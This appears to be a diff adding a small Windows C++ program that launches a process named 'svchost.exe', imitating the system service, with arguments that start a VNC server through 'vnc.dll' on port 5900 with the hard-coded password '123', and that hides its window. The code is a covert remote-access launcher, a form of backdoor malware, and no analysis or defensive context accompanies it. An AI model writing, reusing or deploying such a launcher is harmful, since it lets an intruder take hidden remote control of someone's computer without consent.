@@ -1,0 +1,33 @@
+// 1.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include<windows.h>
+
+void main()
+{
+	char cmd[1024]="svchost.exe";
+	char pas[1024]=" vnc.dll,VNC -port ";
+
+   char port[12]="5900";
+    char password[25]=" -password 123";
+   //char pas[1024]=" vnc.dll,VNC -port 5900 -password 123";
+    strcat(pas,port);
+    strcat(pas,password);
+	
+
+
+  STARTUPINFO si; //进程启动时需要初始化的结构
+PROCESS_INFORMATION pi; //进程启动后的有关信息
+si.cb = sizeof(STARTUPINFO);
+GetStartupInfo(&si); 
+si.wShowWindow = SW_HIDE;//这里设置窗口为显示，SW_HIDE为隐藏窗口
+si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+//CreateProcess(NULL,
+//cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);
+
+CreateProcess(cmd,
+pas,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);
+//return 0;   
+ MessageBox(0,cmd,pas, MB_OK);
+}
